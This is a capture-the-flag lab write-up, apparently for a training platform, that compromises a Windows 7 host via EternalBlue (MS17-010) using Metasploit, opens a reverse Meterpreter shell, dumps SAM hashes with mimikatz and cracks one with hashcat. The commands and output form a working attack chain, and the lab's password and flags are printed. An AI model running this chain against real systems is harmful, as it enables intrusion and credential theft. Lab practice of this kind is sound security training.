
Voici un certain nombre de règles à faire respecter pendant la formation :
- Interdiction de lire des WU
- Vous devez utiliser Mimikatz pour le post exploit
- Brute force juste autorisé pour crack des hash

Liste des outils qui peuvent vous servir : 
- NMAP
- Searchsploit
- Metasploit
- Mimikatz
- John/Hashcat
# Write - Up
## Reconnaissance

```
[Oct 12, 2024 - 15:02:20 (CEST)] exegol-thm /workspace # nmap -sV 10.10.210.24
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-12 15:02 CEST
Nmap scan report for 10.10.210.24
Host is up (0.029s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.57 seconds
```

**Windows 7**, the system seems really outdated. It could be vulnerable to EternalBlue. NMAP vulns scripts are able to detect **ms17-010**.

```
[Oct 12, 2024 - 15:03:38 (CEST)] exegol-thm /workspace # nmap --script=vuln 10.10.210.24
Starting Nmap 7.93 ( https://nmap.org ) at 2024-10-12 15:09 CEST
Nmap scan report for 10.10.210.24
Host is up (0.072s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 101.19 seconds
```

The system is indeed vulnerable to ms17-010. So using Metasploit we search for the pre built exploit.  
## Exploit


![[Pasted image 20241012151429.png]]

Using the correct exploit : 

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.210.24
RHOST => 10.10.210.24
```

Don't forget to set the correct **LHOST**. I don't now why but I have to launch the exploit several times before it works. 

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.8.61.12:4444
[*] 10.10.210.24:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.210.24:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.210.24:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.210.24:445 - The target is vulnerable.
[*] 10.10.210.24:445 - Connecting to target for exploitation.
[+] 10.10.210.24:445 - Connection established for exploitation.
[+] 10.10.210.24:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.210.24:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.210.24:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.210.24:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.210.24:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] 10.10.210.24:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.210.24:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.210.24:445 - Sending all but last fragment of exploit packet
[*] 10.10.210.24:445 - Starting non-paged pool grooming
[+] 10.10.210.24:445 - Sending SMBv2 buffers
[+] 10.10.210.24:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.210.24:445 - Sending final SMBv2 buffers.
[*] 10.10.210.24:445 - Sending last fragment of exploit packet!
[*] 10.10.210.24:445 - Receiving response from exploit packet
[+] 10.10.210.24:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.210.24:445 - Sending egg to corrupted connection.
[*] 10.10.210.24:445 - Triggering free of corrupted buffer.
[*] Sending stage (201798 bytes) to 10.10.210.24
[*] Meterpreter session 1 opened (10.8.61.12:4444 -> 10.10.210.24:49221) at 2024-10-12 15:29:43 +0200
[+] 10.10.210.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.210.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.210.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```


## Post-Exploit

Since we want to use **mimikatz** we load the module into our meterpreter. 

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > load mimikatz
[!] The "mimikatz" extension has been replaced by "kiwi". Please use this in future.
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

Then using the meterpreter we can run some mimikatz commands and thus run the `lsa_dump_sam` command. This command exploits LSA (Local Security Authority) and in particular the LSASS (Local Security Authority Server Service) to request the content of the SAM database.

```
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : JON-PC
SysKey : 55bd17830e678f18a3110daf2c17d4c7
Local SID : S-1-5-21-2633577515-2458672280-487782642

SAMKey : c74ee832c5b6f4030dbbc7b51a011b1e

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Jon
  Hash NTLM: ffb43f0de35be4d9917ac0cc8ad57f8d
```

Using https://crackstation.net/  we can easily crack Jon's password. 

![[Pasted image 20241012153208.png]]

Manual crack : 

```
hashcat -m 1000 -a 0 "ffb43f0de35be4d9917ac0cc8ad57f8d" /opt/my-resources/wordlists/famous/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-13th Gen Intel(R) Core(TM) i7-13620H, 6864/13792 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 4 MB

Dictionary cache hit:
* Filename..: /opt/my-resources/wordlists/famous/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921518
* Keyspace..: 14344386

ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
Time.Started.....: Sat Oct 12 15:38:24 2024 (2 secs)
Time.Estimated...: Sat Oct 12 15:38:26 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/opt/my-resources/wordlists/famous/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6730.5 kH/s (0.25ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10207232/14344386 (71.16%)
Rejected.........: 0/10207232 (0.00%)
Restore.Point....: 10190848/14344386 (71.04%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: alynev2 -> almendrarayada

Started: Sat Oct 12 15:38:23 2024
Stopped: Sat Oct 12 15:38:27 2024
```

Flags :

search -f flag*.txt

```
c:\flag1.txt
flag{access_the_machine}

c:\Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}

C:\Users\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}
```